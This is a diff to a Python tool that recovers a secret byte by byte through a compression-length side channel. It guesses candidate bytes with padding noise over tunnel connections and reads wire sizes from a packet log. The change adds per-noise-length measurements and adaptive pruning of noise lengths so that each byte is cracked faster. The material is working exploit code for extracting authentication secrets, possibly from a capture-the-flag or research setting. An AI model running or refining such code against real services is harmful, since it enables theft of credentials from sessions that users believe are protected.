@@ -122,6 +122,9 @@ async def _sweep_round(
       9. Read packet log.
     """
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
+    per_nl: dict[int, dict[bytes, int]] = {
+        nl: {c: 0 for c in alphabet} for nl in noise_lengths
+    }
     for noise_len in noise_lengths:
         noise = _make_noise(noise_len)
         for cb in alphabet:
@@ -153,14 +156,16 @@ async def _sweep_round(
             await mw.drain()
             if settle > 0:
                 await asyncio.sleep(settle)
-            sums[cb] += _c2s_total(packet_log.snapshot())
+            measured = _c2s_total(packet_log.snapshot())
+            sums[cb] += measured
+            per_nl[noise_len][cb] = measured
 
             try:
                 mw.close()
             except Exception:  # noqa: BLE001
                 pass
 
-    return sums
+    return sums, per_nl
 
 
 # ---------------------------------------------------------------------------
@@ -181,21 +186,25 @@ async def crack_byte_position(
 ) -> tuple[bytes, dict[bytes, int]]:
     """Recover one byte, repeating rounds until *margin >= min_margin*.
 
-    Each round sweeps all noise lengths with fresh tunnel connections.
-    Candidate sums accumulate across rounds.  After each round,
-    candidates whose sum exceeds ``best_sum + min_margin`` are
-    eliminated — they can never catch the leader because wrong
-    candidates never compress smaller than the correct one.  This
-    progressively shrinks the alphabet, reducing the number of
-    flush+AUTH cycles in later rounds.
+    Each round sweeps noise lengths with fresh tunnel connections.
+    Two progressive optimisations reduce work in later rounds:
+
+    * **Candidate elimination**: after each round, candidates whose
+      cumulative sum exceeds ``best_sum + min_margin`` are dropped.
+    * **Adaptive noise sweep**: after round 1, noise lengths where
+      every candidate produced the same wire size (no padding-boundary
+      crossing) are dropped.  Neighbours of productive noise lengths
+      are kept to handle channel-number jitter that shifts the
+      crossing between rounds.
     """
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
     active = list(alphabet)
+    active_noise = list(noise_lengths)
 
     for rnd in range(1, max_rounds + 1):
-        round_sums = await _sweep_round(
+        round_sums, round_per_nl = await _sweep_round(
             session, packet_log, prefix, active,
-            noise_lengths, settle, flush_bytes,
+            active_noise, settle, flush_bytes,
         )
         for c in active:
             sums[c] += round_sums[c]
@@ -214,13 +223,38 @@ async def crack_byte_position(
             active = [c for c, _ in ranked[:2]]
         eliminated = before - len(active)
 
+        # Adaptive noise: after the first full sweep, keep only noise
+        # lengths that showed any differential signal (not all
+        # candidates at the same wire size), plus their immediate
+        # neighbours to handle jitter.  Never drop below 3.
+        noise_pruned = 0
+        if rnd == 1 and len(active_noise) == len(noise_lengths):
+            productive = set()
+            for nl in active_noise:
+                vals = list(round_per_nl[nl].values())
+                if min(vals) < max(vals):
+                    productive.add(nl)
+            if productive:
+                keep = set()
+                for nl in productive:
+                    keep.add(nl)
+                    if nl - 1 in set(noise_lengths):
+                        keep.add(nl - 1)
+                    if nl + 1 in set(noise_lengths):
+                        keep.add(nl + 1)
+                new_noise = sorted(keep)
+                if len(new_noise) >= 3:
+                    noise_pruned = len(active_noise) - len(new_noise)
+                    active_noise = new_noise
+
         LOG.info(
             "%s round=%d best=%r sum=%d  2nd=%r sum=%d  "
-            "margin=%d  alive=%d (-%d)",
+            "margin=%d  alive=%d (-%d)  noise=%d (-%d)",
             log_prefix, rnd,
             best.decode("latin-1"), best_sum,
             second.decode("latin-1"), second_sum,
             margin, len(active), eliminated,
+            len(active_noise), noise_pruned,
         )
         if margin >= min_margin:
             break
